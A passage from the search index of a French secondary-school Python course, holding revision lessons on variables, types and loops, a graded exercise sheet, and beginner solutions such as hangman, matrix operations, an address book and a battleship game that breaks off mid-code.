9\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/structures_conditionnelles_boucles/#boucles-imbriquees","title":"Boucles imbriqu\u00e9es","text":"<pre><code># Table de multiplication\nfor i in range(1, 6):\n    for j in range(1, 6):\n        print(f\"{i} x {j} = {i*j}\")\n    print()  # Ligne vide\n\n# Motif d'\u00e9toiles\nfor ligne in range(5):\n    for colonne in range(ligne + 1):\n        print(\"*\", end=\"\")\n    print()  # Nouvelle ligne\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/structures_conditionnelles_boucles/#exercices-de-revision","title":"Exercices de r\u00e9vision","text":""},{"location":"terminale/I-Rappels/Cours/structures_conditionnelles_boucles/#exercice-1-calculatrice-simple","title":"Exercice 1 : Calculatrice simple","text":"<p>\u00c9crire un programme qui : 1. Demande deux nombres et une op\u00e9ration (+, -, *, /) 2. Effectue le calcul selon l'op\u00e9ration choisie 3. G\u00e8re le cas de la division par z\u00e9ro 4. Propose de recommencer</p>"},{"location":"terminale/I-Rappels/Cours/structures_conditionnelles_boucles/#exercice-2-jeu-de-devinette","title":"Exercice 2 : Jeu de devinette","text":"<p>\u00c9crire un programme qui : 1. G\u00e9n\u00e8re un nombre al\u00e9atoire entre 1 et 100 2. Demande \u00e0 l'utilisateur de deviner 3. Indique si le nombre est trop grand ou trop petit 4. Compte le nombre d'essais 5. F\u00e9licite quand le nombre est trouv\u00e9</p>"},{"location":"terminale/I-Rappels/Cours/structures_conditionnelles_boucles/#exercice-3-validation-de-saisie","title":"Exercice 3 : Validation de saisie","text":"<p>\u00c9crire un programme qui : 1. Demande une note entre 0 et 20 2. Redemande tant que la note n'est pas valide 3. Affiche la mention correspondante 4. Propose de saisir une nouvelle note</p>"},{"location":"terminale/I-Rappels/Cours/structures_conditionnelles_boucles/#exercice-4-motifs-geometriques","title":"Exercice 4 : Motifs g\u00e9om\u00e9triques","text":"<p>\u00c9crire des programmes qui affichent : 1. Un triangle d'\u00e9toiles 2. Un carr\u00e9 creux 3. Un losange 4. Une pyramide invers\u00e9e</p>"},{"location":"terminale/I-Rappels/Cours/variables_et_types/","title":"Variables et types de donn\u00e9es","text":""},{"location":"terminale/I-Rappels/Cours/variables_et_types/#objectifs","title":"Objectifs","text":"<p>Rappeler les notions fondamentales de variables et types de donn\u00e9es vues en Premi\u00e8re.</p>"},{"location":"terminale/I-Rappels/Cours/variables_et_types/#variables-en-python","title":"Variables en Python","text":""},{"location":"terminale/I-Rappels/Cours/variables_et_types/#declaration-et-affectation","title":"D\u00e9claration et affectation","text":"<pre><code># D\u00e9claration et affectation d'une variable\nnom = \"Alice\"\nage = 17\ntaille = 1.65\nest_majeur = False\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/variables_et_types/#regles-de-nommage","title":"R\u00e8gles de nommage","text":"<ul> <li>Commence par une lettre ou un underscore</li> <li>Peut contenir des lettres, chiffres et underscores</li> <li>Sensible \u00e0 la casse</li> <li>Pas de mots-cl\u00e9s Python</li> </ul>"},{"location":"terminale/I-Rappels/Cours/variables_et_types/#types-de-donnees-de-base","title":"Types de donn\u00e9es de base","text":""},{"location":"terminale/I-Rappels/Cours/variables_et_types/#types-numeriques","title":"Types num\u00e9riques","text":"<pre><code># Entier (int)\nnombre_eleves = 25\n\n# Flottant (float)\nmoyenne = 14.5\n\n# Op\u00e9rations arithm\u00e9tiques\nresultat = 10 + 3 * 2  # 16\nquotient = 15 // 4     # 3 (division enti\u00e8re)\nreste = 15 % 4         # 3 (modulo)\npuissance = 2 ** 3     # 8\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/variables_et_types/#type-chaine-de-caracteres-str","title":"Type cha\u00eene de caract\u00e8res (str)","text":"<pre><code># D\u00e9claration\nprenom = \"Marie\"\nnom = 'Dupont'\nmessage = \"\"\"Bonjour,\nComment allez-vous ?\"\"\"\n\n# Concat\u00e9nation\nnom_complet = prenom + \" \" + nom\n\n# M\u00e9thodes utiles\nprint(prenom.upper())     # MARIE\nprint(nom.lower())        # dupont\nprint(len(nom_complet))   # 11\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/variables_et_types/#type-booleen-bool","title":"Type bool\u00e9en (bool)","text":"<pre><code># Valeurs bool\u00e9ennes\nvrai = True\nfaux = False\n\n# Op\u00e9rateurs de comparaison\nresultat1 = 5 &gt; 3      # True\nresultat2 = 10 == 10   # True\nresultat3 = 7 != 8     # True\n\n# Op\u00e9rateurs logiques\nresultat4 = True and False   # False\nresultat5 = True or False    # True\nresultat6 = not True         # False\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/variables_et_types/#conversion-de-types","title":"Conversion de types","text":"<pre><code># Conversion explicite\nnombre_str = \"42\"\nnombre_int = int(nombre_str)    # 42\nnombre_float = float(nombre_str) # 42.0\n\n# Conversion vers cha\u00eene\nage = 17\nage_str = str(age)  # \"17\"\n\n# Attention aux erreurs\n# int(\"3.14\")  # ValueError\n# int(\"abc\")   # ValueError\n</code></pre>"},{"location":"terminale/I-Rappels/Cours/variables_et_types/#exercices-de-revision","title":"Exercices de r\u00e9vision","text":""},{"location":"terminale/I-Rappels/Cours/variables_et_types/#exercice-1-variables-et-calculs","title":"Exercice 1 : Variables et calculs","text":"<p>\u00c9crire un programme qui : 1. Demande le nom et l'\u00e2ge de l'utilisateur 2. Calcule l'ann\u00e9e de naissance 3. Affiche un message personnalis\u00e9</p>"},{"location":"terminale/I-Rappels/Cours/variables_et_types/#exercice-2-manipulation-de-chaines","title":"Exercice 2 : Manipulation de cha\u00eenes","text":"<p>\u00c9crire un programme qui : 1. Demande une phrase \u00e0 l'utilisateur 2. Affiche la phrase en majuscules 3. Compte le nombre de caract\u00e8res 4. V\u00e9rifie si la phrase contient le mot \"Python\"</p>"},{"location":"terminale/I-Rappels/Cours/variables_et_types/#exercice-3-calculs-et-conditions","title":"Exercice 3 : Calculs et conditions","text":"<p>\u00c9crire un programme qui : 1. Demande deux nombres 2. Effectue les quatre op\u00e9rations de base 3. V\u00e9rifie si le premier nombre est pair 4. D\u00e9termine le plus grand des deux nombres</p>"},{"location":"terminale/I-Rappels/Exercices/fiche_exercices_rappels/","title":"Fiche d'exercices : Rappels de Premi\u00e8re","text":""},{"location":"terminale/I-Rappels/Exercices/fiche_exercices_rappels/#navigation-par-themes","title":"Navigation par th\u00e8mes","text":"Variables et Types Conditions et Boucles Fonctions Listes et Tableaux Projets Int\u00e9gr\u00e9s Introduction Exercice 1 : Calculatrice personnelle <p>Cr\u00e9ez un programme qui :</p> <ul> <li>Demande le nom de l'utilisateur</li> <li>Demande deux nombres</li> <li>Effectue les quatre op\u00e9rations de base</li> <li>Affiche les r\u00e9sultats avec un message personnalis\u00e9</li> </ul> <p>Exemple : \"Bonjour Alice ! 5 + 3 = 8\"</p> Voir la solution Facile Exercice 2 : Convertisseur d'unit\u00e9s <p>\u00c9crivez un programme qui convertit :</p> <ul> <li>Des m\u00e8tres en pieds et pouces</li> <li>Des kilogrammes en livres</li> <li>Des degr\u00e9s Celsius en Fahrenheit</li> </ul> <p>Le programme doit demander le type de conversion et la valeur \u00e0 convertir.</p> Voir la solution Moyen Exercice 3 : Validateur de donn\u00e9es <p>Cr\u00e9ez un programme qui valide :</p> <ul> <li>Un \u00e2ge (entre 0 et 120)</li> <li>Un email (contient @ et .)</li> <li>Un mot de passe (au moins 8 caract\u00e8res)</li> <li>Un num\u00e9ro de t\u00e9l\u00e9phone (10 chiffres)</li> </ul> <p>Utilisez des variables bool\u00e9ennes pour stocker les r\u00e9sultats de validation.</p> Voir la solution Introduction Exercice 4 : Syst\u00e8me de notes <p>Cr\u00e9ez un programme qui :</p> <ul> <li>Demande une note sur 20</li> <li>Affiche la mention correspondante</li> <li>Indique si l'\u00e9l\u00e8ve est admis (\u2265 10)</li> <li>Propose de saisir une nouvelle note</li> </ul> <p>Mentions : Tr\u00e8s bien (\u226516), Bien (\u226514), Assez bien (\u226512), Passable (\u226510)</p> Voir la solution Facile Exercice 5 : Tables de multiplication <p>\u00c9crivez un programme qui :</p> <ul> <li>Demande un nombre \u00e0 l'utilisateur</li> <li>Affiche sa table de multiplication (1 \u00e0 10)</li> <li>Utilise une boucle for</li> <li>Formate joliment l'affichage</li> </ul> <p>Bonus : Permettre de choisir la limite (au lieu de 10)</p> Voir la solution Moyen Exercice 6 : Jeu de devinette am\u00e9lior\u00e9 <p>Cr\u00e9ez un jeu qui :</p> <ul> <li>G\u00e9n\u00e8re un nombre al\u00e9atoire entre 1 et 100</li> <li>Donne des indices (trop grand/petit)</li> <li>Compte le nombre d'essais</li> <li>Propose diff\u00e9rents niveaux de difficult\u00e9</li> <li>Permet de rejouer</li> </ul> Voir la solution Difficile Exercice 7 : Motifs g\u00e9om\u00e9triques <p>Cr\u00e9ez des programmes qui dessinent :</p> <ul> <li>Un triangle d'\u00e9toiles de taille variable</li> <li>Un carr\u00e9 creux avec des bordures</li> <li>Un losange centr\u00e9</li> <li>Une pyramide invers\u00e9e</li> </ul> <p>La taille doit \u00eatre param\u00e9trable par l'utilisateur.</p> Voir la solution Introduction Exercice 8 : Biblioth\u00e8que math\u00e9matique <p>Cr\u00e9ez des fonctions pour :</p> <ul> <li><code>aire_cercle(rayon)</code> : calcule l'aire d'un cercle</li> <li><code>perimetre_rectangle(longueur, largeur)</code></li> <li><code>moyenne(a, b, c)</code> : moyenne de trois nombres</li> <li><code>est_pair(nombre)</code> : retourne True si pair</li> </ul> <p>Testez chaque fonction avec plusieurs exemples.</p> Voir la solution Facile Exercice 9 : G\u00e9n\u00e9rateur de mots de passe <p>Cr\u00e9ez une fonction qui g\u00e9n\u00e8re un mot de passe :</p> <ul> <li>Longueur param\u00e9trable</li> <li>Inclut lettres, chiffres et symboles</li> <li>Option pour exclure les caract\u00e8res ambigus</li> <li>Fonction de validation de la force</li> </ul> Voir la solution Moyen Exercice 10 : Calculatrice scientifique <p>D\u00e9veloppez un programme avec des fonctions pour :</p> <ul> <li>Op\u00e9rations de base (+, -, *, /)</li> <li>Puissance et racine carr\u00e9e</li> <li>Fonctions trigonom\u00e9triques</li> <li>Menu interactif</li> <li>Historique des calculs</li> </ul> Voir la solution Introduction Exercice 11 : Gestionnaire de notes <p>Cr\u00e9ez un programme qui :</p> <ul> <li>Stocke les notes d'un \u00e9l\u00e8ve dans une liste</li> <li>Calcule la moyenne</li> <li>Trouve la meilleure et la pire note</li> <li>Compte les notes au-dessus de la moyenne</li> <li>Permet d'ajouter/supprimer des notes</li> </ul> Voir la solution Facile Exercice 12 : Tri et recherche <p>Impl\u00e9mentez :</p> <ul> <li>Tri par s\u00e9lection (sans utiliser sort())</li> <li>Recherche lin\u00e9aire</li> <li>Suppression des doublons</li> <li>Fusion de deux listes tri\u00e9es</li> </ul> <p>Testez avec des listes de nombres et de cha\u00eenes.</p> Voir la solution Moyen Exercice 13 : Jeu du pendu <p>D\u00e9veloppez un jeu du pendu avec :</p> <ul> <li>Liste de mots pr\u00e9d\u00e9finis</li> <li>Affichage du mot avec des tirets</li> <li>Gestion des lettres d\u00e9j\u00e0 propos\u00e9es</li> <li>Compteur d'erreurs avec limite</li> <li>Interface utilisateur claire</li> </ul> Voir la solution Difficile Exercice 14 : Matrices et op\u00e9rations <p>Travaillez avec des matrices (listes de listes) :</p> <ul> <li>Addition et soustraction de matrices</li> <li>Multiplication par un scalaire</li> <li>Transposition</li> <li>V\u00e9rification de sym\u00e9trie</li> <li>Calcul du d\u00e9terminant (2x2)</li> </ul> Voir la solution Projet Projet 1 : Carnet d'adresses <p>D\u00e9veloppez un carnet d'adresses complet :</p> <ul> <li>Ajouter/modifier/supprimer des contacts</li> <li>Recherche par nom ou t\u00e9l\u00e9phone</li> <li>Tri alphab\u00e9tique</li> <li>Sauvegarde dans un fichier texte</li> <li>Interface menu avec options</li> </ul> <p>Comp\u00e9tences : Listes, fonctions, fichiers, validation</p> Voir la solution Projet Projet 2 : Jeu de bataille navale <p>Cr\u00e9ez une bataille navale simplifi\u00e9e :</p> <ul> <li>Grille 10x10 avec coordonn\u00e9es</li> <li>Placement al\u00e9atoire des navires</li> <li>Syst\u00e8me de tir avec feedback</li> <li>Compteur de coups et de navires coul\u00e9s</li> <li>Affichage de la grille mise \u00e0 jour</li> </ul> <p>Comp\u00e9tences : Matrices, boucles, conditions, fonctions</p> Voir la solution Projet Projet 3 : Gestionnaire de biblioth\u00e8que <p>Syst\u00e8me de gestion pour une petite biblioth\u00e8que :</p> <ul> <li>Base de donn\u00e9es de livres (titre, auteur, ISBN)</li> <li>Syst\u00e8me d'emprunt et de retour</li> <li>Recherche multicrit\u00e8res</li> <li>Statistiques (livres les plus emprunt\u00e9s)</li> <li>Gestion des retards</li> </ul> <p>Comp\u00e9tences : Structures de donn\u00e9es, algorithmes, validation</p> Voir la solution Solution : Calculatrice personnelle <pre><code>nom = input(\"Quel est votre nom ? \")\nnombre1 = float(input(\"Premier nombre : \"))\nnombre2 = float(input(\"Deuxi\u00e8me nombre : \"))\n\naddition = nombre1 + nombre2\nsoustraction = nombre1 - nombre2\nmultiplication = nombre1 * nombre2\ndivision = nombre1 / nombre2 if nombre2 != 0 else \"Division par z\u00e9ro!\"\n\nprint(f\"Bonjour {nom} !\")\nprint(f\"{nombre1} + {nombre2} = {addition}\")\nprint(f\"{nombre1} - {nombre2} = {soustraction}\")\nprint(f\"{nombre1} \u00d7 {nombre2} = {multiplication}\")\nprint(f\"{nombre1} \u00f7 {nombre2} = {division}\")</code></pre> Solution : Syst\u00e8me de notes <pre><code>while True:\n    note = float(input(\"Entrez une note sur 20 : \"))\n\n    if note &gt;= 16:\n        mention = \"Tr\u00e8s bien\"\n    elif note &gt;= 14:\n        mention = \"Bien\"\n    elif note &gt;= 12:\n        mention = \"Assez bien\"\n    elif note &gt;= 10:\n        mention = \"Passable\"\n    else:\n        mention = \"Insuffisant\"\n\n    if note &gt;= 10:\n        resultat = \"Admis\"\n    else:\n        resultat = \"Refus\u00e9\"\n\n    print(f\"Note : {note}/20\")\n    print(f\"Mention : {mention}\")\n    print(f\"R\u00e9sultat : {resultat}\")\n\n    continuer = input(\"Nouvelle note ? (o/n) : \")\n    if continuer.lower() != 'o':\n        break</code></pre> Solution : Biblioth\u00e8que math\u00e9matique <pre><code>import math\n\ndef aire_cercle(rayon):\n    return math.pi * rayon ** 2\n\ndef perimetre_rectangle(longueur, largeur):\n    return 2 * (longueur + largeur)\n\ndef moyenne(a, b, c):\n    return (a + b + c) / 3\n\ndef est_pair(nombre):\n    return nombre % 2 == 0\n\n# Tests\nprint(f\"Aire cercle (r=5) : {aire_cercle(5):.2f}\")\nprint(f\"P\u00e9rim\u00e8tre rectangle (3x4) : {perimetre_rectangle(3, 4)}\")\nprint(f\"Moyenne (10,15,20) : {moyenne(10, 15, 20)}\")\nprint(f\"8 est pair : {est_pair(8)}\")\nprint(f\"7 est pair : {est_pair(7)}\")</code></pre> Solution : Gestionnaire de notes <pre><code>notes = []\n\ndef ajouter_note():\n    note = float(input(\"Nouvelle note : \"))\n    notes.append(note)\n    print(f\"Note {note} ajout\u00e9e.\")\n\ndef supprimer_note():\n    if notes:\n        print(f\"Notes actuelles : {notes}\")\n        index = int(input(\"Index \u00e0 supprimer : \"))\n        if 0 &lt;= index &lt; len(notes):\n            note_supprimee = notes.pop(index)\n            print(f\"Note {note_supprimee} supprim\u00e9e.\")\n        else:\n            print(\"Index invalide.\")\n    else:\n        print(\"Aucune note \u00e0 supprimer.\")\n\ndef calculer_statistiques():\n    if not notes:\n        print(\"Aucune note enregistr\u00e9e.\")\n        return\n\n    moyenne = sum(notes) / len(notes)\n    meilleure = max(notes)\n    pire = min(notes)\n    au_dessus_moyenne = len([n for n in notes if n &gt; moyenne])\n\n    print(f\"Moyenne : {moyenne:.2f}\")\n    print(f\"Meilleure note : {meilleure}\")\n    print(f\"Pire note : {pire}\")\n    print(f\"Notes au-dessus de la moyenne : {au_dessus_moyenne}\")\n\n# Menu principal\nwhile True:\n    print(\"\\n1. Ajouter note\")\n    print(\"2. Supprimer note\")\n    print(\"3. Statistiques\")\n    print(\"4. Quitter\")\n\n    choix = input(\"Votre choix : \")\n\n    if choix == '1':\n        ajouter_note()\n    elif choix == '2':\n        supprimer_note()\n    elif choix == '3':\n        calculer_statistiques()\n    elif choix == '4':\n        break\n    else:\n        print(\"Choix invalide.\")</code></pre> Solution : Tri et recherche <pre><code>def tri_selection(liste):\n    \"\"\"Tri par s\u00e9lection\"\"\"\n    n = len(liste)\n    for i in range(n):\n        min_index = i\n        for j in range(i + 1, n):\n            if liste[j] &lt; liste[min_index]:\n                min_index = j\n        liste[i], liste[min_index] = liste[min_index], liste[i]\n    return liste\n\ndef recherche_lineaire(liste, element):\n    \"\"\"Recherche lin\u00e9aire\"\"\"\n    for i, valeur in enumerate(liste):\n        if valeur == element:\n            return i\n    return -1\n\ndef supprimer_doublons(liste):\n    \"\"\"Supprime les doublons en gardant l'ordre\"\"\"\n    resultat = []\n    for element in liste:\n        if element not in resultat:\n            resultat.append(element)\n    return resultat\n\ndef fusionner_listes_triees(liste1, liste2):\n    \"\"\"Fusionne deux listes tri\u00e9es\"\"\"\n    resultat = []\n    i, j = 0, 0\n\n    while i &lt; len(liste1) and j &lt; len(liste2):\n        if liste1[i] &lt;= liste2[j]:\n            resultat.append(liste1[i])\n            i += 1\n        else:\n            resultat.append(liste2[j])\n            j += 1\n\n    # Ajouter les \u00e9l\u00e9ments restants\n    resultat.extend(liste1[i:])\n    resultat.extend(liste2[j:])\n\n    return resultat\n\n# Tests\nnombres = [64, 34, 25, 12, 22, 11, 90]\nprint(f\"Liste originale : {nombres}\")\nprint(f\"Liste tri\u00e9e : {tri_selection(nombres.copy())}\")\nprint(f\"Position de 25 : {recherche_lineaire(nombres, 25)}\")\n\nliste_doublons = [1, 2, 2, 3, 4, 4, 5]\nprint(f\"Sans doublons : {supprimer_doublons(liste_doublons)}\")\n\nliste1 = [1, 3, 5, 7]\nliste2 = [2, 4, 6, 8]\nprint(f\"Fusion : {fusionner_listes_triees(liste1, liste2)}\")</code></pre> Solution : Jeu du pendu <pre><code>import random\n\ndef jeu_pendu():\n    mots = [\"python\", \"programmation\", \"ordinateur\", \"algorithme\", \n            \"fonction\", \"variable\", \"boucle\", \"condition\"]\n\n    mot_secret = random.choice(mots).upper()\n    lettres_trouvees = set()\n    lettres_essayees = set()\n    erreurs = 0\n    max_erreurs = 6\n\n    print(\"=== JEU DU PENDU ===\")\n    print(f\"Le mot contient {len(mot_secret)} lettres.\")\n\n    while erreurs &lt; max_erreurs:\n        # Affichage du mot avec les lettres trouv\u00e9es\n        mot_affiche = \"\"\n        for lettre in mot_secret:\n            if lettre in lettres_trouvees:\n                mot_affiche += lettre + \" \"\n            else:\n                mot_affiche += \"_ \"\n\n        print(f\"\\nMot : {mot_affiche}\")\n        print(f\"Lettres essay\u00e9es : {', '.join(sorted(lettres_essayees))}\")\n        print(f\"Erreurs : {erreurs}/{max_erreurs}\")\n\n        # V\u00e9rifier si le mot est trouv\u00e9\n        if set(mot_secret) &lt;= lettres_trouvees:\n            print(f\"\\n\ud83c\udf89 F\u00e9licitations ! Vous avez trouv\u00e9 le mot : {mot_secret}\")\n            break\n\n        # Demander une lettre\n        lettre = input(\"Proposez une lettre : \").upper()\n\n        if len(lettre) != 1 or not lettre.isalpha():\n            print(\"Veuillez entrer une seule lettre.\")\n            continue\n\n        if lettre in lettres_essayees:\n            print(\"Vous avez d\u00e9j\u00e0 essay\u00e9 cette lettre.\")\n            continue\n\n        lettres_essayees.add(lettre)\n\n        if lettre in mot_secret:\n            lettres_trouvees.add(lettre)\n            print(f\"\u2713 Bonne lettre !\")\n        else:\n            erreurs += 1\n            print(f\"\u2717 Lettre incorrecte.\")\n\n    if erreurs &gt;= max_erreurs:\n        print(f\"\\n\ud83d\udc80 Perdu ! Le mot \u00e9tait : {mot_secret}\")\n\n    rejouer = input(\"\\nVoulez-vous rejouer ? (o/n) : \")\n    if rejouer.lower() == 'o':\n        jeu_pendu()\n\n# Lancer le jeu\njeu_pendu()</code></pre> Solution : Matrices et op\u00e9rations <pre><code>def creer_matrice(lignes, colonnes, valeur=0):\n    \"\"\"Cr\u00e9e une matrice remplie d'une valeur\"\"\"\n    return [[valeur for _ in range(colonnes)] for _ in range(lignes)]\n\ndef afficher_matrice(matrice):\n    \"\"\"Affiche une matrice de fa\u00e7on lisible\"\"\"\n    for ligne in matrice:\n        print(\" \".join(f\"{x:4}\" for x in ligne))\n    print()\n\ndef additionner_matrices(mat1, mat2):\n    \"\"\"Addition de deux matrices\"\"\"\n    if len(mat1) != len(mat2) or len(mat1[0]) != len(mat2[0]):\n        return None\n\n    resultat = []\n    for i in range(len(mat1)):\n        ligne = []\n        for j in range(len(mat1[0])):\n            ligne.append(mat1[i][j] + mat2[i][j])\n        resultat.append(ligne)\n    return resultat\n\ndef multiplier_par_scalaire(matrice, scalaire):\n    \"\"\"Multiplication par un scalaire\"\"\"\n    resultat = []\n    for ligne in matrice:\n        nouvelle_ligne = [element * scalaire for element in ligne]\n        resultat.append(nouvelle_ligne)\n    return resultat\n\ndef transposer(matrice):\n    \"\"\"Transposition d'une matrice\"\"\"\n    lignes = len(matrice)\n    colonnes = len(matrice[0])\n\n    resultat = creer_matrice(colonnes, lignes)\n    for i in range(lignes):\n        for j in range(colonnes):\n            resultat[j][i] = matrice[i][j]\n    return resultat\n\ndef est_symetrique(matrice):\n    \"\"\"V\u00e9rifie si une matrice est sym\u00e9trique\"\"\"\n    if len(matrice) != len(matrice[0]):\n        return False\n\n    for i in range(len(matrice)):\n        for j in range(len(matrice)):\n            if matrice[i][j] != matrice[j][i]:\n                return False\n    return True\n\ndef determinant_2x2(matrice):\n    \"\"\"Calcule le d\u00e9terminant d'une matrice 2x2\"\"\"\n    if len(matrice) != 2 or len(matrice[0]) != 2:\n        return None\n\n    return matrice[0][0] * matrice[1][1] - matrice[0][1] * matrice[1][0]\n\n# Tests\nmat1 = [[1, 2], [3, 4]]\nmat2 = [[5, 6], [7, 8]]\n\nprint(\"Matrice 1 :\")\nafficher_matrice(mat1)\n\nprint(\"Matrice 2 :\")\nafficher_matrice(mat2)\n\nprint(\"Addition :\")\nafficher_matrice(additionner_matrices(mat1, mat2))\n\nprint(\"Multiplication par 3 :\")\nafficher_matrice(multiplier_par_scalaire(mat1, 3))\n\nprint(\"Transpos\u00e9e de mat1 :\")\nafficher_matrice(transposer(mat1))\n\nprint(f\"mat1 est sym\u00e9trique : {est_symetrique(mat1)}\")\nprint(f\"D\u00e9terminant de mat1 : {determinant_2x2(mat1)}\")</code></pre> Solution : Carnet d'adresses <pre><code>import json\nimport os\n\nclass CarnetAdresses:\n    def __init__(self, fichier=\"contacts.json\"):\n        self.fichier = fichier\n        self.contacts = self.charger_contacts()\n\n    def charger_contacts(self):\n        \"\"\"Charge les contacts depuis le fichier\"\"\"\n        if os.path.exists(self.fichier):\n            try:\n                with open(self.fichier, 'r', encoding='utf-8') as f:\n                    return json.load(f)\n            except:\n                return []\n        return []\n\n    def sauvegarder_contacts(self):\n        \"\"\"Sauvegarde les contacts dans le fichier\"\"\"\n        with open(self.fichier, 'w', encoding='utf-8') as f:\n            json.dump(self.contacts, f, indent=2, ensure_ascii=False)\n\n    def ajouter_contact(self):\n        \"\"\"Ajoute un nouveau contact\"\"\"\n        nom = input(\"Nom : \").strip()\n        if not nom:\n            print(\"Le nom est obligatoire.\")\n            return\n\n        telephone = input(\"T\u00e9l\u00e9phone : \").strip()\n        email = input(\"Email : \").strip()\n        adresse = input(\"Adresse : \").strip()\n\n        contact = {\n            \"nom\": nom,\n            \"telephone\": telephone,\n            \"email\": email,\n            \"adresse\": adresse\n        }\n\n        self.contacts.append(contact)\n        self.sauvegarder_contacts()\n        print(f\"Contact {nom} ajout\u00e9 avec succ\u00e8s.\")\n\n    def afficher_contacts(self):\n        \"\"\"Affiche tous les contacts\"\"\"\n        if not self.contacts:\n            print(\"Aucun contact enregistr\u00e9.\")\n            return\n\n        contacts_tries = sorted(self.contacts, key=lambda x: x['nom'].lower())\n\n        print(\"\\n=== CARNET D'ADRESSES ===\")\n        for i, contact in enumerate(contacts_tries, 1):\n            print(f\"{i}. {contact['nom']}\")\n            if contact['telephone']:\n                print(f\"   \ud83d\udcde {contact['telephone']}\")\n            if contact['email']:\n                print(f\"   \ud83d\udce7 {contact['email']}\")\n            if contact['adresse']:\n                print(f\"   \ud83c\udfe0 {contact['adresse']}\")\n            print()\n\n    def rechercher_contact(self):\n        \"\"\"Recherche un contact\"\"\"\n        terme = input(\"Rechercher (nom ou t\u00e9l\u00e9phone) : \").strip().lower()\n        if not terme:\n            return\n\n        resultats = []\n        for contact in self.contacts:\n            if (terme in contact['nom'].lower() or \n                terme in contact['telephone']):\n                resultats.append(contact)\n\n        if resultats:\n            print(f\"\\n{len(resultats)} r\u00e9sultat(s) trouv\u00e9(s) :\")\n            for contact in resultats:\n                print(f\"- {contact['nom']} ({contact['telephone']})\")\n        else:\n            print(\"Aucun contact trouv\u00e9.\")\n\n    def supprimer_contact(self):\n        \"\"\"Supprime un contact\"\"\"\n        if not self.contacts:\n            print(\"Aucun contact \u00e0 supprimer.\")\n            return\n\n        self.afficher_contacts()\n        try:\n            index = int(input(\"Num\u00e9ro du contact \u00e0 supprimer : \")) - 1\n            if 0 &lt;= index &lt; len(self.contacts):\n                contact_supprime = self.contacts.pop(index)\n                self.sauvegarder_contacts()\n                print(f\"Contact {contact_supprime['nom']} supprim\u00e9.\")\n            else:\n                print(\"Num\u00e9ro invalide.\")\n        except ValueError:\n            print(\"Veuillez entrer un num\u00e9ro valide.\")\n\n    def menu_principal(self):\n        \"\"\"Menu principal de l'application\"\"\"\n        while True:\n            print(\"\\n=== CARNET D'ADRESSES ===\")\n            print(\"1. Ajouter un contact\")\n            print(\"2. Afficher tous les contacts\")\n            print(\"3. Rechercher un contact\")\n            print(\"4. Supprimer un contact\")\n            print(\"5. Quitter\")\n\n            choix = input(\"Votre choix : \").strip()\n\n            if choix == '1':\n                self.ajouter_contact()\n            elif choix == '2':\n                self.afficher_contacts()\n            elif choix == '3':\n                self.rechercher_contact()\n            elif choix == '4':\n                self.supprimer_contact()\n            elif choix == '5':\n                print(\"Au revoir !\")\n                break\n            else:\n                print(\"Choix invalide.\")\n\n# Lancement de l'application\nif __name__ == \"__main__\":\n    carnet = CarnetAdresses()\n    carnet.menu_principal()</code></pre> Solution : Jeu de bataille navale <pre><code>import random\n\nclass BatailleNavale:\n    def __init__(self):\n        self.taille = 10\n        self.grille = [['~' for _ in range(self.taille)] for _ in range(self.taille)]\n        self.navires = []\n        self.coups_tires = 0\n        self.navires_coules = 0\n        self.total_navires = 5\n\n    def placer_navires(self):\n        \"\"\"Place les navires al\u00e9atoirement sur la grille\"\"\"\n        tailles_navires = [5, 4, 3, 3, 2]  # Porte-avions, croiseur, 2 destroyers, sous-marin\n\n        for taille in tailles_navires:\n            place = False\n            tentatives = 0\n\n            while not place and tentatives &lt; 100:\n                # Direction al\u00e9atoire (0=horizontal, 1=vertical)\n                direction = random.randint(0, 1)\n\n                if direction == 0:  # Horizontal\n                    x = random.randint(0, self.taille - taille)\n                    y = random.randint(0, self.taille - 1)\n                    positions = [(x + i, y) for i in range(taille)]\n                else:  # Vertical\n                    x = random.randint(0, self.taille - 1)\n                    y = random.randint(0, self.taille - taille)\n                    positions = [(x, y + i) for i in range(taille)]\n\n                # V\u00e9rifier si les positions sont libres\n                if all(self.grille[pos[1]][pos[0]] == '~' for pos in positions):\n                    # Placer le navire\n                    for pos in positions:\n                        self.grille[pos[1]][pos[0]] = 'N'\n\n                    self.navires.append({\n                        'positions': positions,\n                        'touches': set(),\n                        'coule': False\n                    })\n                    place = True\n\n                tentatives += 1\n\n    def afficher_grille(self, montrer_navires=False):\n        \"\"\"Affiche la grille de jeu\"\"\"\n        print(\"\\n   \", end=\"\")\n        for i in range(self.taille):\n            print(f\"{i:2}\", end=\" \")\n        print()\n\n        for i in range(self.taille):\n            print(f\"{i:2} \", end=\"\")\n            for j in range(self.taille):\n                cellule = self.grille[i][j]\n\n                if cellule == 'N' and not montrer_navires:\n                    print(\" ~\", end=\" \")\n                elif cellule == 'X':\n                    print(\" X\", end=\" \")  # Touch\u00e9\n                elif cellule == 'O':\n                    print(\" O\", end=\" \")  # Rat\u00e9\n                elif cellule == 'N' and montrer_navires:\n                    print(\" N\", end=\" \")  # Navire (mode debug)\n                else:\n                    print(\" ~\", end=\" \")  # Eau\n            print()\n\n    def tirer(self, x, y):\n        \"\"\"Effectue un tir aux coordonn\u00e9es donn\u00e9es\"\"\"\n        if not (0 &lt;= x &lt; self.taille and 0 &lt;= y &lt; self.taille):\n            return \"Coordonn\u00e9es invalides\"\n\n        if self.grille[y][x] in ['X', 'O']:\n            return \"D\u00e9j\u00e0 tir\u00e9 ici\"\n\n        self.coups_tires += 1\n\n        if self.grille[y][x] == 'N':\n            self.grille[y][x] = 'X'\n\n            # V\u00e9rifier quel navire a \u00e9t\u00e9 touch\u00e9\n            for navire in self.navires:\n                if (x, y) in navire['positions'] and not navire['coule']:\n                    navire['touches'].add((x, y))\n\n                    # V\u00e9rifier si le navire est coul\u00e9\n                    if len(navire['touches']) == len(navire['positions']):\n                        navire['coule'] = True\n                        self.navires_coules += 1\n                        return \"Coul\u00e9 !\"\n                    else:\n                        return \"Touch\u00e9 !\"\n        else:\n            self.grille[y][x] = 'O'\n            return \"Rat\u00e9\"\n\n    def jeu_termine(self):\n        \"\"\"V\u00e9rifie si tous les navires sont coul\u00e9s\"\"\"\n        return self.navires_coules == self.total_navires\n\n    def jouer(self):\n        \"\"\"Boucle principale du jeu\"\"\"\n        print(\"=== BATAILLE NAVALE ===\")\n        